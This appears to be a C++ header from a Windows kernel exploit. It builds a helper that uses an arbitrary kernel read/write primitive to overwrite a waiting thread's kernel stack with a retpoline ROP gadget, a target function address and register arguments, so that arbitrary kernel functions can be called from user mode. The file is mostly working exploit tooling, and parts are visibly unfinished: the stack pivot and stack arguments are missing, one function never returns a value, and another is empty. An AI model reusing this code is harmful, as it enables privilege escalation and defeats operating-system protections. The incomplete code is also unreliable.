#pragma once

#include "Resolves.h"

#include <queue>
#include <functional>

extern HANDLE g_NotifyCall;
extern HANDLE g_WaitForCallEnd;

extern "C"
NTSTATUS NtSignalAndWaitForSingleObject(
	HANDLE ObjectToSignal,
	HANDLE ObjectToWaitOn,
	bool Aleratable,
	DWORD Timeout
);

extern "C"
NTSTATUS NtWaitForSingleObject(
	HANDLE Object,
	bool Aleratable,
	DWORD Timeout
);

constexpr ULONG c_TrapFrameSize = 0x190;

class KInvoker 
{

	static kAddress GetNtWaitForSingleObjectReturnAddress(kAddress CallingThread)
	{
		//
		// We target the last return address before returning to UserMode. The call stack after
		// calling NtWaitForSingleObject is something like the following:
		// - nt!NtWaitForSingleObject
		// - nt!KiSystemServiceCopyEnd+C
		// - ntdll!NtWaitForSingleObject
		//
		// Note that we're switching to UM stack after KiSystemServiceCopyEnd, hence it makes sense to target it.
		// We'll start scanning from the initial stack 
		//

		constexpr ULONG c_InitialStackOffset = 0x28;
		kAddress initialStack = g_Rw->ReadQword(CallingThread + c_InitialStackOffset);

		kAddress returnAddress = g_Rw->ReadQword(initialStack - c_TrapFrameSize - sizeof(kAddress));
		return returnAddress;
	}

	template <typename... Args>
	static void OverrideThreadStackWithFunctionCall(
		_In_ kAddress Function,
		_In_ kAddress CallingThread,
		_Inout_ Qword* ReturnValue,
		_In_ std::tuple<Args...>&& Args
	) {

		kAddress rsp = GetNtWaitForSingleObjectReturnAddress(CallingThread);

		//
		// Read previous trap frame
		//
		std::vector<Byte> trapFrame = g_Rw->ReadBuffer(rsp + 8, c_TrapFrameSize);

		// Pivot to our own stack!
		

		//
		// We'll use the retpoline gadget. Recall it looks as follows:
		//
		// __guard_retpoline_exit_indirect_rax:
		//  ...
		//	mov rax, [rsp+0x20]
		//	mov rcx, [rsp+0x28]
		//	mov rdx, [rsp+0x30]
		//	mov r8,  [rsp+0x38]
		//	mov r9,  [rsp+0x40]
		//	add rsp, 0x28
		//  jmp rax
		//

		g_Rw->WriteQword(rsp, s_RetpolineGadget);

		// add jump target: Function
		rsp += 8;
		g_Rw->WriteQword(rsp + 0x20, Function);

		// add register arguments
		if constexpr (std::size(Args) >= 1) 
			g_Rw->WriteQword(rsp + 0x28, Qword(std::get<0>(Args)));
		if constexpr (std::size(Args) >= 2)
			g_Rw->WriteQword(rsp + 0x30, Qword(std::get<1>(Args)));
		if constexpr (std::size(Args) >= 3)
			g_Rw->WriteQword(rsp + 0x38, Qword(std::get<2>(Args)));
		if constexpr (std::size(Args) >= 4)
			g_Rw->WriteQword(rsp + 0x40, Qword(std::get<3>(Args)));

		// add remaining stack arguments

	}

	/*
	Kernel callbacks: we'll put
	
	*/

public:
	template <typename... Args>
	Qword CallKernelFunction(
		kAddress Function,
		Args... Arguments) 
	{
		auto args = std::make_tuple(std::forward<Args>(Arguments)...);
		HANDLE event = CreateEventA(nullptr, true, false, nullptr);
		DWORD currentTid = GetCurrentThreadId();
		Qword returnValue = 0;

		m_TaskQueue.push([args, event, Function, currentTid, &returnValue]
			{
				kAddress thread = Resolves::GetThreadAddress(currentTid);
				OverrideThreadStackWithFunctionCall(Function, thread, &returnValue, args);
				SetEvent(event);
			});

		NtWaitForSingleObject(event, false, INFINITE);
	}

private:
	std::queue<std::function<void()>> m_TaskQueue;

	static kAddress s_RetpolineGadget;
	static kAddress s_PivotGadget;
	static kAddress s_PopRbpGadget;
};



void WorkerThread(PVOID Context) {

}